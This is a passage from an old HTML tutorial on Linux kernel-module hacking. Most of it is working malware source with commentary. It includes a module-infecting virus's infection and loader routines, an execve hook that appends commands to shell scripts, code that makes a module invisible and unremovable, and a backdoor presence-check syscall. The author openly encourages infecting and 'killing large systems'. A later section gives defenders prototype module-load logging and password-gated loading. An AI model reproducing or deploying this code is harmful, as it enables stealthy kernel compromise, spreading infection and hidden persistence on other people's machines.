                                                                                                                                                    after compiling your virus_module.c to its objectcode you have to look at its
                                                                                                                                                    size (how many bytes). After this you know where the original host_module.o will
                                                                                                                                                    begin in the packed one (you must compile the virus_module two times : the first
                                                                                                                                                    one to check the objectcode size, the second one with the source changed
                                                                                                                                                    concerning objectsize which must be hardcoded...). After these steps your
                                                                                                                                                    virus_module should be able to extract the original host_module.o from the
                                                                                                                                                    packed one. You have to save this extracted module somewhere, and load it via
                                                                                                                                                    request_module("orig_host_module.o"). After loading the original host_module.o
                                                                                                                                                    your virus_module (which is also loaded from the insmod [issued by user, or
                                                                                                                                                    kerneld]) can start infecting any loaded modules.<br>
                                                                                                                                                    Stealthf0rk (SVAT) used the sys_delete_module(...) systemcall for doing the
                                                                                                                                                    infection, so let's take a look at his hacked systemcall (I only added some
                                                                                                                                                    comments) :

                                                                                                                                                    <xmp>
                                                                                                                                                        /*just the hacked systemcall*/
                                                                                                                                                        int new_delete_module(char *modname)
                                                                                                                                                        {
                                                                                                                                                            /*number of infected modules*/
                                                                                                                                                            static int infected = 0;
                                                                                                                                                            int retval = 0, i = 0;
                                                                                                                                                            char *s = NULL, *name = NULL;

                                                                                                                                                            /*call the original sys_delete_module*/
                                                                                                                                                            retval = old_delete_module(modname);

                                                                                                                                                            if ((name = (char*)vmalloc(MAXPATH + 60 + 2)) == NULL)
                                                                                                                                                            return retval;

                                                                                                                                                            /*check files to infect -> this comes from hacked sys_create_module; just
 a feature of *this* LKM infector, nothing generic for this type of virus*/
                                                                                                                                                            for (i = 0; files2infect[i][0] && i < 7; i++)
                                                                                                                                                        {
                                                                                                                                                            strcat(files2infect[i], ".o");
                                                                                                                                                            if ((s  = get_mod_name(files2infect[i])) == NULL)
                                                                                                                                                        {
                                                                                                                                                            return retval;
                                                                                                                                                        }
                                                                                                                                                            name = strcpy(name, s);
                                                                                                                                                            if (!is_infected(name))
                                                                                                                                                        {
                                                                                                                                                            /*this is just a macro wrapper for printk(...)*/
                                                                                                                                                            DPRINTK("try 2 infect %s as #%d\n", name, i);
                                                                                                                                                            /*increase infection counter*/
                                                                                                                                                            infected++;
                                                                                                                                                            /*the infect function*/
                                                                                                                                                            infectfile(name);
                                                                                                                                                        }
                                                                                                                                                            memset(files2infect[i], 0, 60 + 2);
                                                                                                                                                        } /* for */
                                                                                                                                                            /* its enough */
                                                                                                                                                            /*how many modules were infected, if enough then stop and quit*/
                                                                                                                                                            if (infected >= ENOUGH)
                                                                                                                                                            cleanup_module();
                                                                                                                                                            vfree(name);
                                                                                                                                                            return retval;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    Well there is only one function interesting in this systemcall: infectfile(...).
                                                                                                                                                    So let's examine that function (again only some comments were added by me) :

                                                                                                                                                    <xmp>
                                                                                                                                                        int infectfile(char *filename)
                                                                                                                                                        {
                                                                                                                                                            char *tmp = "/tmp/t000";
                                                                                                                                                            int in = 0, out = 0;
                                                                                                                                                            struct file *file1, *file2;

                                                                                                                                                            /*don't get confused, this is a macro define by the virus. It does the
 kernel space -> user space handling for systemcall arguments(see I.4)*/
                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            /*open objectfile of the module which was unloaded*/
                                                                                                                                                            in = open(filename, O_RDONLY, 0640);
                                                                                                                                                            /*create a temp. file*/
                                                                                                                                                            out = open(tmp, O_RDWR|O_TRUNC|O_CREAT, 0640);
                                                                                                                                                            /*see BEGIN_KMEM*/
                                                                                                                                                            END_KMEM

                                                                                                                                                            DPRINTK("in infectfile: in = %d out = %d\n", in, out);
                                                                                                                                                            if (in <= 0 || out <= 0)
                                                                                                                                                            return -1;
                                                                                                                                                            file1 = current->files->fd[in];
                                                                                                                                                            file2 = current->files->fd[out];
                                                                                                                                                            if (!file1 || !file2)
                                                                                                                                                            return -1;
                                                                                                                                                            /*copy module objectcode (host) to file2*/
                                                                                                                                                            cp(file1, file2);
                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            file1->f_pos = 0;
                                                                                                                                                            file2->f_pos = 0;
                                                                                                                                                            /* write Vircode [from mem] */
                                                                                                                                                            DPRINTK("in infetcfile: filenanme = %s\n", filename);
                                                                                                                                                            file1->f_op->write(file1->f_inode, file1, VirCode, MODLEN);
                                                                                                                                                            cp(file2, file1);
                                                                                                                                                            close(in);
                                                                                                                                                            close(out);
                                                                                                                                                            unlink(tmp);
                                                                                                                                                            END_KMEM
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                    </xmp>
                                                                                                                                                    I think the infection function should be quite clear.<br>
                                                                                                                                                    There is only thing left which I think is necessary to discuss : How does
                                                                                                                                                    the infected module first start the virus, and load the original module (we know
                                                                                                                                                    the theory, but how to do it in reality) ?<br>
                                                                                                                                                    For answering this question lets take a look at a function called
                                                                                                                                                    load_real_mod(char *path_name, char* name) which manages that problem :

                                                                                                                                                    <xmp>
                                                                                                                                                        /* Is that simple: we disinfect the module [hide 'n seek]
                                                                                                                                                        * and send a request to kerneld to load
                                                                                                                                                        * the orig mod. N0 fuckin' parsing for symbols and headers
                                                                                                                                                        * is needed - cool.
                                                                                                                                                        */
                                                                                                                                                        int load_real_mod(char *path_name, char *name)
                                                                                                                                                        {
                                                                                                                                                            int r = 0, i = 0;
                                                                                                                                                            struct file *file1, *file2;
                                                                                                                                                            int in =  0, out = 0;

                                                                                                                                                            DPRINTK("in load_real_mod name = %s\n", path_name);
                                                                                                                                                            if (VirCode)
                                                                                                                                                            vfree(VirCode);
                                                                                                                                                            VirCode = vmalloc(MODLEN);
                                                                                                                                                            if (!VirCode)
                                                                                                                                                            return -1;
                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            /*open the module just loaded (->the one which is already infected)*/
                                                                                                                                                            in = open(path_name, O_RDONLY, 0640);
                                                                                                                                                            END_KMEM
                                                                                                                                                            if (in <= 0)
                                                                                                                                                            return -1;
                                                                                                                                                            file1 = current->files->fd[in];
                                                                                                                                                            if (!file1)
                                                                                                                                                            return -1;
                                                                                                                                                            /* read Vircode [into mem] */
                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            file1->f_op->read(file1->f_inode, file1, VirCode, MODLEN);
                                                                                                                                                            close(in);
                                                                                                                                                            END_KMEM
                                                                                                                                                            /*split virus / orig. module*/
                                                                                                                                                            disinfect(path_name);
                                                                                                                                                            /*load the orig. module with kerneld*/
                                                                                                                                                            r = request_module(name);
                                                                                                                                                            DPRINTK("in load_real_mod: request_module = %d\n", r);
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    It should be clear *why* this LKM infector need kerneld now, we need to load the
                                                                                                                                                    original module by requesting it with request_module(...).
                                                                                                                                                    I hope you understood this very basic journey through the world of LKM infectors
                                                                                                                                                    (virus). The next sub sections will show some basic extensions / ideas concering
                                                                                                                                                    LKM infectors.

                                                                                                                                                    <H4><A NAME="II.8.1."></A>8.1  How a LKM virus can infect any file (not just modules)</h4>

                                                                                                                                                    Please don't blame me for not showing a working example of this idea, I just
                                                                                                                                                    don't have the time to implement it at the moment (look for further releases).
                                                                                                                                                    As you saw in II.4.2 it is possible to catch the execute of every file using
                                                                                                                                                    an intercepted sys_execve(...) systemcall. Now imagine a hacked systemcall which
                                                                                                                                                    appends some data to the program that is going to be executed. The next time
                                                                                                                                                    this program is started, it first starts our added part and then the original
                                                                                                                                                    program (just a basic virus scheme). We all know that there are some existing
                                                                                                                                                    Linux / unix viruses out there, so why don't we try to use LKMs infect our elf
                                                                                                                                                    executables not just modules.We could infect our executables,in a way that they
                                                                                                                                                    check for UID=0 and then load again our infection module... I hope you
                                                                                                                                                    understood the general idea. <br>
                                                                                                                                                    I have to admit, that the modification needed to elf files is quite tricky, but
                                                                                                                                                    with enough time you could do it (it was done several times before, just take a
                                                                                                                                                    look at existing Linux viruses).<br>
                                                                                                                                                    First of all you have to check for the file type which is going to be execute
                                                                                                                                                    by sys_execve(...). There are several ways to do it; one of the fastest is to
                                                                                                                                                    read some bytes from the file and checking them against the ELF string. After
                                                                                                                                                    this you can use write(...) / read(...) / ... calls to modify the file, look at
                                                                                                                                                    the LKM infector to see how it does it.<br>
                                                                                                                                                    My theory would stay theory without any proof, so I present a very easy and
                                                                                                                                                    useless LKM *script* infector. You cannot do anything virus like with it, it just
                                                                                                                                                    infects a script with certain commands and nothing else; no real virus features.<br>
                                                                                                                                                    I show you this example as a concept of LKMs infecting any file you execute.
                                                                                                                                                    Even Java files could be infected, because of the features provided by the Linux
                                                                                                                                                    kernel. Here comes the little LKM script infector :

                                                                                                                                                    <xmp>
                                                                                                                                                        #define __KERNEL__
                                                                                                                                                        #define MODULE

                                                                                                                                                        /*taken from the original LKM infector; it makes the whole LKM a lot easier*/
                                                                                                                                                        #define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
                                                                                                                                                        #define END_KMEM   set_fs(old_fs);}

                                                                                                                                                        #include <linux/version.h>
                                                                                                                                                        #include <linux/mm.h>
                                                                                                                                                        #include <linux/unistd.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <asm/string.h>
                                                                                                                                                        #include <linux/fcntl.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/malloc.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <linux/kerneld.h>

                                                                                                                                                        int __NR_myexecve;

                                                                                                                                                        extern void *sys_call_table[];

                                                                                                                                                        int (*orig_execve) (const char *, const char *[], const char *[]);

                                                                                                                                                        int (*open)(char *, int, int);
                                                                                                                                                        int (*write)(unsigned int, char*, unsigned int);
                                                                                                                                                        int (*read)(unsigned int, char*, unsigned int);
                                                                                                                                                        int (*close)(int);


                                                                                                                                                        /*see II.4.2 for explanation*/
                                                                                                                                                        int my_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            long __res;
                                                                                                                                                            __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
                                                                                                                                                            return (int) __res;
                                                                                                                                                        }

                                                                                                                                                        /*infected execve systemcall + infection routine*/
                                                                                                                                                        int hacked_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            char *test, j;
                                                                                                                                                            int ret;
                                                                                                                                                            int host = 0;

                                                                                                                                                            /*just a buffer for reading up to 20 files (needed for identification of
 execute file*/
                                                                                                                                                            test = (char *) kmalloc(21, GFP_KERNEL);

                                                                                                                                                            /*open the host script, which is going to be executed*/
                                                                                                                                                            host=open(filename, O_RDWR|O_APPEND, 0640);

                                                                                                                                                            BEGIN_KMEM

                                                                                                                                                            /*read the first 20 bytes*/
                                                                                                                                                            read(host, test, 20);

                                                                                                                                                            /*is it a normal shell script (as you see, you can modify this for *any*
 executable*/
                                                                                                                                                            if (strstr(test, "#!/bin/sh")!=NULL)
                                                                                                                                                        {
                                                                                                                                                            /*a little debug message*/
                                                                                                                                                            printk("<1>INFECT !\n");
                                                                                                                                                            /*we are friendly and attach a peaceful command*/
                                                                                                                                                            write(host, "touch /tmp/WELCOME", strlen("touch /tmp/WELCOME"));
                                                                                                                                                        }
                                                                                                                                                            END_KMEM
                                                                                                                                                            /*modification is done, so close our host*/
                                                                                                                                                            close(host);
                                                                                                                                                            /*free allocated memory*/
                                                                                                                                                            kfree(test);
                                                                                                                                                            /*execute the file (the file is execute WITH the changes made by us*/
                                                                                                                                                            ret = my_execve(filename, argv, envp);
                                                                                                                                                            return ret;
                                                                                                                                                        }


                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            __NR_myexecve = 250;
                                                                                                                                                            while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
                                                                                                                                                            __NR_myexecve--;
                                                                                                                                                            orig_execve = sys_call_table[SYS_execve];
                                                                                                                                                            if (__NR_myexecve != 0)
                                                                                                                                                        {
                                                                                                                                                            printk("<1>everything OK\n");
                                                                                                                                                            sys_call_table[__NR_myexecve] = orig_execve;
                                                                                                                                                            sys_call_table[SYS_execve] = (void *) hacked_execve;
                                                                                                                                                        }

                                                                                                                                                            /*we need some functions*/
                                                                                                                                                            open = sys_call_table[__NR_open];
                                                                                                                                                            close = sys_call_table[__NR_close];
                                                                                                                                                            write = sys_call_table[__NR_write];
                                                                                                                                                            read = sys_call_table[__NR_read];
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_execve]=orig_execve;
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    This is too easy to waste some words on it. Of course, this module does
                                                                                                                                                    <i>not</i> need kerneld for spreading (interesting for kernel without kerneld
                                                                                                                                                    support). <br>
                                                                                                                                                    I hope you got the idea on infecting any executable, this is a very strong
                                                                                                                                                    method of killing large systems.

                                                                                                                                                    <H4><A NAME="II.8.2."></A>8.2  How can a LKM virus help us to get in</h4>

                                                                                                                                                    As you know virus coders are not hackers, so what about interesting features for
                                                                                                                                                    hackers. Think about this problem (only ten seconds), you should realize, that
                                                                                                                                                    a whole system could be yours by introducing a trojan (infected) LKM.<br>
                                                                                                                                                    Remember all the nice hacks we discussed till now.Even without trojans you could
                                                                                                                                                    hack a system with LKMs. Just use a local buffer overflow to load a LKM in your
                                                                                                                                                    home directoy. Believe me, it is easier to infect a system with a real good LKM
                                                                                                                                                    than doing the same stuff as root again and again. It's more elagent to let the
                                                                                                                                                    LKM make the work for you. Be CREATIVE...

                                                                                                                                                    <H3><A NAME="II.9."></A>9. Making our LKM invisible & unremovable </h3>

                                                                                                                                                    Now it's time to start talking about the most important / interesting Hack I
                                                                                                                                                    will present. This idea comes from plaguez's LKM published in Phrack (other
                                                                                                                                                    people like Solar Designer discussed this before...).<br>
                                                                                                                                                    So far we are able to hide files, processes, directories, and whatever we
                                                                                                                                                    want. But we <i>cannot</i> hide our own <i>LKM</i>. Just load a LKM and take a look at
                                                                                                                                                    /proc/modules. There are many ways we can solve this problem. The first solution
                                                                                                                                                    could be a partial file hiding (see II.4.3). This would be easy to implement,
                                                                                                                                                    but there is a better more advanced and secure way. Using this technique you
                                                                                                                                                    must also intercept the sys_query_module(...) systemcall. An example of this
                                                                                                                                                    approach can be seen in A-b.<br>
                                                                                                                                                    As I explained in I.1 a module is finally loaded by issuing a init_module(...)
                                                                                                                                                    systemcall which will start the module's init function. init_module(...) gets
                                                                                                                                                    an argument : struct mod_routines *routines.  This structure contains very
                                                                                                                                                    important information for loading the LKM. It is possible for us to manipulate
                                                                                                                                                    some data from this structure in a way our module will have no name and no
                                                                                                                                                    references. After this the system will no longer show our LKM in /proc/modules,
                                                                                                                                                    because it ignores LKMs with no name and a refernce count equal to 0. The
                                                                                                                                                    following lines show how to access the part of mod_routines, in order to hide
                                                                                                                                                    the module.<br>

                                                                                                                                                    <xmp>
                                                                                                                                                        /*from Phrack & AFHRM*/
                                                                                                                                                        int init_module()
                                                                                                                                                        {
                                                                                                                                                            register struct module *mp asm("%ebp");   // or whatever register it is in
                                                                                                                                                            *(char*)mp->name=0;
                                                                                                                                                            mp->size=0;
                                                                                                                                                            mp->ref=0;
                                                                                                                                                            ...
                                                                                                                                                            </xmp>

                                                                                                                                                            This code trusts in the fact that gcc did not manipulate the ebp register
                                                                                                                                                            because we need it in order to find the right memory location. After finding
                                                                                                                                                            the structure we can set the structure's name and references members to 0 which
                                                                                                                                                            will make our module invisible and also unremovable, because you can only remove
                                                                                                                                                            LKMs which the kernel knows, but our module is unknow to the kernel.<br>
                                                                                                                                                            Remember that this trick only works if you use gcc in way it does not touch the
                                                                                                                                                            register you need to access for getting the structure.You must use the following
                                                                                                                                                            gcc options :

                                                                                                                                                            <xmp>
                                                                                                                                                            #gcc -c -O3 -fomit-frame-pointer module.c
                                                                                                                                                            </xmp>

                                                                                                                                                            fomit-frame-pointer says cc not to keep frame pointer in registers for functions
                                                                                                                                                            that don't need one. This keeps our register clean after the function call of
                                                                                                                                                            init_module(...), so that we can access the structure.<br>
                                                                                                                                                            In my opinion this is the most important trick, because it helps us to develope
                                                                                                                                                            hidden LKMs which are also unremovable.

                                                                                                                                                            <H3><A NAME="II.10."></A>10. Other ways of abusing the Kerneldaemon</h3>

                                                                                                                                                            In II.8 you saw one way of abusing kerneld. It helped us to spread the LKM
                                                                                                                                                            infector. It could also be helpful for our LKM backdoor (see II.5.1). Imagine
                                                                                                                                                            the socketcall loading a module instead of starting our backdoor shellscript or
                                                                                                                                                            program. You could load a module adding an entry to passwd or inetd.conf. After
                                                                                                                                                            loading this second LKM you have many possibilities of changing systemfiles.
                                                                                                                                                            Again, be creative.

                                                                                                                                                            <H3><A NAME="II.11."></A>11. How to check for presents of our LKM</h3>

                                                                                                                                                            We learned many ways a module can help us to subvert a system. So imagine you
                                                                                                                                                            code yourself a nice backdoor tool (or take an existing) which isn't implemented
                                                                                                                                                            in the LKM you use on that system; just something like pingd, WWW remote shell,
                                                                                                                                                            shell, .... How can you check after logging in on the system that your LKM is
                                                                                                                                                            still working? Imagine what would happen if you enter a session and the admin is
                                                                                                                                                            waiting for you without your LKM loaded (so no process hiding etc.). So you
                                                                                                                                                            start doing you job on that system (reading your own logs, checking some mail
                                                                                                                                                            traffic and so on) and every step is monitored by the admin. Well no good
                                                                                                                                                            situation, we must know that our LKM is working with a simple check.<br>
                                                                                                                                                            I suppose the following way is a good solution (although there may be many other
                                                                                                                                                            good ones):
                                                                                                                                                            <ul>
                                                                                                                                                            <li> implement a special systemcall in your module<br>
                                                                                                                                                            <li> write a little user space program checking for that systemcall<br>
                                                                                                                                                            </ul>
                                                                                                                                                            Here is a module which implements our 'check systemcall' :

                                                                                                                                                            <xmp>
                                                                                                                                                            #define MODULE
                                                                                                                                                            #define __KERNEL__

                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <asm/unistd.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <sys/types.h>
                                                                                                                                                            #include <asm/fcntl.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <linux/dirent.h>
                                                                                                                                                            #include <sys/mman.h>
                                                                                                                                                            #include <linux/string.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/malloc.h>

                                                                                                                                                            #define SYS_CHECK 200

                                                                                                                                                            extern void* sys_call_table[];


                                                                                                                                                            int sys_check()
                                                                                                                                                        {
                                                                                                                                                            return 666;
                                                                                                                                                        }

                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_CHECK]=sys_check;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {}
                                                                                                                                                            </xmp>

                                                                                                                                                            If you issue a systemcall with the number 200 in eax we should get a return of
                                                                                                                                                            666. So here is our user space program checking for this :

                                                                                                                                                            <xmp>
                                                                                                                                                            #include <linux/errno.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <errno.h>

                                                                                                                                                            extern void *sys_call_table[];

                                                                                                                                                            int check()
                                                                                                                                                        {
                                                                                                                                                            __asm__("movl $200,%eax
                                                                                                                                                            int $0x80");
                                                                                                                                                        }

                                                                                                                                                            main()
                                                                                                                                                        {
                                                                                                                                                            int ret;
                                                                                                                                                            ret = check();
                                                                                                                                                            if (ret!=666)
                                                                                                                                                            printf("Our module is *not* present !!\n");
                                                                                                                                                            else
                                                                                                                                                            printf("Our module is present, continue...\n");
                                                                                                                                                        }
                                                                                                                                                            </xmp>


                                                                                                                                                            In my opinion this is one of the easiest ways to check for presents of our LKM,
                                                                                                                                                            just try it.


                                                                                                                                                            <u><b>
                                                                                                                                                            <H2>III. Soltutions (for admins)</H2>
                                                                                                                                                            </u></b>
                                                                                                                                                            <P><P>


                                                                                                                                                            <H3><A NAME="III.1."></A>1. LKM Detector Theory & Ideas</h3>

                                                                                                                                                            I think it is time to help admins securing their system from hostile LKMs.<br>
                                                                                                                                                            Before explaining some theories remember the following for a secure system :<br>
                                                                                                                                                            <ul>
                                                                                                                                                            <li> never install <i>any</i> LKMs you don't have the sources for (of course, this is
                                                                                                                                                            also relevant for normal executables)<br>
                                                                                                                                                            <li> if you have the sources, check them (if you can). Remember the tcpd trojan
                                                                                                                                                            problem. Large software packets are mostly quite complex to understand, but
                                                                                                                                                            if you need a very secure system you should analyse the source code.<br>
                                                                                                                                                            </ul>
                                                                                                                                                            Even if you follow those tips it could be possible that an intruder activates an
                                                                                                                                                            LKM on your system (overflows etc.). <br>
                                                                                                                                                            So what about a LKM logging every module loaded, and denying every load attempt
                                                                                                                                                            from a directory different from a secure one (to avoid simple overflows; that's no
                                                                                                                                                            perfect way...). The logging can be easily done by intercepting the
                                                                                                                                                            create_module(...) systemcall. The same way you could check for the directory
                                                                                                                                                            the loaded module comes from. <br>
                                                                                                                                                            It would also be possible to deny any module loading, but this is a very bad way,
                                                                                                                                                            because you really need them. So what about modifying module loading in a way
                                                                                                                                                            you can supply a password, which will be checked in your intercepted
                                                                                                                                                            create_module(...). If the password is correct the module will be loaded, if not
                                                                                                                                                            it will be dropped.<br>
                                                                                                                                                            It should be clear that you have to hide your LKM to make it unremovable. So
                                                                                                                                                            let's take a look at some prototype implemantations of the logging LKM and the
                                                                                                                                                            password protected create_module(...) systemcall.<br>

                                                                                                                                                            <H4><A NAME="III.1.1."></A>1.1  Practical Example of a prototype Detector</h4>

                                                                                                                                                            Nothing to say about that simple implementation, just intercept
                                                                                                                                                            sys_create_module(...) and log the names of modules which were loaded.

                                                                                                                                                            <xmp>

                                                                                                                                                            #define MODULE
                                                                                                                                                            #define __KERNEL__

                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <asm/unistd.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <sys/types.h>
                                                                                                                                                            #include <asm/fcntl.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <linux/dirent.h>
                                                                                                                                                            #include <sys/mman.h>
                                                                                                                                                            #include <linux/string.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/malloc.h>

                                                                                                                                                            extern void* sys_call_table[];


                                                                                                                                                            int (*orig_create_module)(char*, unsigned long);


                                                                                                                                                            int hacked_create_module(char *name, unsigned long size)
                                                                                                                                                        {
                                                                                                                                                            char *kernel_name;
                                                                                                                                                            char hide[]="ourtool";
                                                                                                                                                            int ret;

                                                                                                                                                            kernel_name = (char*) kmalloc(256, GFP_KERNEL);
                                                                                                                                                            memcpy_fromfs(kernel_name, name, 255);

                                                                                                                                                            /*here we log to syslog, but you can log where you want*/
                                                                                                                                                            printk("<1> SYS_CREATE_MODULE : %s\n", kernel_name);

                                                                                                                                                            ret=orig_create_module(name, size);
                                                                                                                                                            return ret;
                                                                                                                                                        }


                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_create_module=sys_call_table[SYS_create_module];
                                                                                                                                                            sys_call_table[SYS_create_module]=hacked_create_module;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_create_module]=orig_create_module;
                                                                                                                                                        }

                                                                                                                                                            </xmp>

                                                                                                                                                            This is all you need, of course you should add the lines required for hiding the
                                                                                                                                                            module, but this is no problem. After making it unremovable this way, a hacker
                                                                                                                                                            can only modify the log file, but you could also save your logs, to a file
                                                                                                                                                            unaccessible for the hacker (see II.1 for required tricks).
                                                                                                                                                            Of course you can also intercept sys_init_module(...)which would also show every
                                                                                                                                                            module, that's just a matter of taste.


                                                                                                                                                            <H4><A NAME="III.1.2."></A>1.2  Practical Example of a prototype password protected create_module(...)</h4>


                                                                                                                                                            This subsection will deal with the possibility to add authentication to module
                                                                                                                                                            loading. We need two things to manage this task :
                                                                                                                                                            <ul>
                                                                                                                                                            <li> a way to check module loading (easy)<br>
                                                                                                                                                            <li> a way to authenticate (quite difficult)<br>
                                                                                                                                                            </ul>
                                                                                                                                                            The first point is very easy to code, just intercept sys_create_module(...) and
                                                                                                                                                            check some variable, which tells the kernel wether this load process is legal.
                                                                                                                                                            But how to do authentication. I must admit that I did not spend many seconds on
                                                                                                                                                            thinking about this problem, so the solution is more than bad, but this is a LKM
                                                                                                                                                            article, so use your brain, and create something better. My way to do it, was
                                                                                                                                                            to intercept the stat(...) systemcall, which is used if you type any command,and
                                                                                                                                                            the system needs to search it. So just type a password as command and the LKM
                                                                                                                                                            will check it in the intercepted stat call [I know this is more than insecure;
                                                                                                                                                            even a Linux starter would be able to defeat this authentication scheme, but
                                                                                                                                                            (again) this is not the point here...]. Take a look at my implemtation (I ripped
                                                                                                                                                            lots of from existing LKMs like the one by plaguez...):<br>

                                                                                                                                                            <xmp>
                                                                                                                                                            #define MODULE
                                                                                                                                                            #define __KERNEL__

                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <asm/unistd.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <sys/types.h>
                                                                                                                                                            #include <asm/fcntl.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <linux/dirent.h>
                                                                                                                                                            #include <sys/mman.h>
                                                                                                                                                            #include <linux/string.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/malloc.h>
                                                                                                                                                            #include <sys/stat.h>


                                                                                                                                                            extern void* sys_call_table[];

                                                                                                                                                            /*if lock_mod=1 THEN ALLOW LOADING A MODULE*/
                                                                                                                                                            int lock_mod=0;

                                                                                                                                                            int __NR_myexecve;

                                                                                                                                                            /*intercept create_module(...) and stat(...) systemcalls*/
                                                                                                                                                            int (*orig_create_module)(char*, unsigned long);
                                                                                                                                                            int (*orig_stat) (const char *, struct old_stat*);

                                                                                                                                                            char *strncpy_fromfs(char *dest, const char *src, int n)
                                                                                                                                                        {
                                                                                                                                                            char *tmp = src;
                                                                                                                                                            int compt = 0;

                                                                                                                                                            do {
                                                                                                                                                            dest[compt++] = __get_user(tmp++, 1);
                                                                                                                                                        }
                                                                                                                                                            while ((dest[compt - 1] != '\0') && (compt != n));

                                                                                                                                                            return dest;
                                                                                                                                                        }

                                                                                                                                                            int hacked_stat(const char *filename, struct old_stat *buf)
                                                                                                                                                        {
                                                                                                                                                            char *name;
                                                                                                                                                            int ret;
                                                                                                                                                            char *password = "password"; /*yeah, a great password*/

                                                                                                                                                            name    = (char *) kmalloc(255, GFP_KERNEL);

                                                                                                                                                            (void) strncpy_fromfs(name, filename, 255);

                                                                                                                                                            /*do we have our password ?*/
                                                                                                                                                            if (strstr(name, password)!=NULL)
                                                                                                                                                        {
                                                                                                                                                            /*allow loading a module for one time*/
                                                                                                                                                            lock_mod=1;
                                                                                                                                                            kfree(name);
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                            else
                                                                                                                                                        {
                                                                                                                                                            kfree(name);
                                                                                                                                                            ret = orig_stat(filename, buf);
                                                                                                                                                        }
                                                                                                                                                            return ret;
                                                                                                                                                        }

                                                                                                                                                            int hacked_create_module(char *name, unsigned long size)
                                                                                                                                                        {
                                                                                                                                                            char *kernel_name;
                                                                                                                                                            char hide[]="ourtool";
                                                                                                                                                            int ret;

                                                                                                                                                            if (lock_mod==1)
                                                                                                                                                        {
                                                                                                                                                            lock_mod=0;
                                                                                                                                                            ret=orig_create_module(name, size);
                                                                                                                                                            return ret;
                                                                                                                                                        }
                                                                                                                                                            else
                                                                                                                                                        {
                                                                                                                                                            printk("<1>MOD-POL : Permission denied !\n");
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                            return ret;
                                                                                                                                                        }


                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            __NR_myexecve = 200;

                                                                                                                                                            while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
                                                                                                                                                            __NR_myexecve--;

                                                                                                                                                            sys_call_table[__NR_myexecve]=sys_call_table[SYS_execve];

                                                                                                                                                            orig_stat=sys_call_table[SYS_prev_stat];
                                                                                                                                                            sys_call_table[SYS_prev_stat]=hacked_stat;

                                                                                                                                                            orig_create_module=sys_call_table[SYS_create_module];
                                                                                                                                                            sys_call_table[SYS_create_module]=hacked_create_module;

                                                                                                                                                            printk("<1>MOD-POL LOADED...\n");
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_prev_stat]=orig_stat;
                                                                                                                                                            sys_call_table[SYS_create_module]=orig_create_module;
                                                                                                                                                        }
                                                                                                                                                            </xmp>

                                                                                                                                                            This code should be clear. The following list tells you what to improve in this
                                                                                                                                                            LKM in order to make it more secure, perhaps a bit too paranoid :) :
                                                                                                                                                            <ul>
                                                                                                                                                            <li>find another way to authenticate (use your own user space interface, with your
                                                                                                                                                            own systemcalls; use userID (not just a plain password); perhaps you have a
                                                                                                                                                            biometric device -> read documentation and code your device driver for Linux
                                                                                                                                                            and use it ;)  ...) BUT REMEMBER: the most secure hardware protection (dongles,
